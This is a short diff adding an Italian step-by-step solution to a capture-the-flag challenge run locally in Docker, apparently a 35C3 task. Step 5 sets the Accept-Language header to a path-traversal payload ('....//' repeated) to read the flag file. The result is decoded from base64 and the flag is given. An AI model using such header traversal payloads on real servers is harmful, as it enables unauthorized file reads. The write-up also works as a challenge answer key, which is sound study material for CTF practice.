@@ -1,0 +1,8 @@
+1. $ cd /c/Users/Andre/Documents/flags
+2. $ chmod -R +rx ./
+3. $ docker compose up -d --build
+4. http://localhost:1235
+5. clicca mod header, Name: Accept-Language, value: ....//....//....//....//flag
+6. ispeziona, copia  in <img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">
+7. decodifica su chrome o $ echo MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo= | base64 -d
+8. risultato 35c3_this_flag_is_the_be5t_fl4g
